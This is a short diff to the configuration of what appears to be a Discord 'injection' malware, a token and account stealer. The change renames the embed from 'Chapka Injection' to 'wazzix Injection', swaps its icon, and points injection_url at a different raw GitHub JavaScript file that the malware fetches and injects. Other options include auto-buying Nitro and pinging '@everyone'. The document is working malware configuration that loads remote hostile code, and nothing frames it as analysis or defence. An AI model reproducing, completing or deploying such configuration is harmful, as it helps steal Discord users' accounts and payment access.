@@ -17,10 +17,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'Chapka Injection', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/1192866107757965362/1199051223039488000/full.png'.replace(/ /g, '%20'), 
+  embed_name: 'wazzix Injection', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1197983983888244900/1199067937055723751/bb.PNG'.replace(/ /g, '%20'), 
   embed_color: 16727870, 
-  injection_url: 'https://raw.githubusercontent.com/nxbi284/crinjrealject/main/crinjrealject.js', 
+  injection_url: 'https://raw.githubusercontent.com/wazzixx/wazzixx/main/wazzixx.js', 
   /**
    
    **/
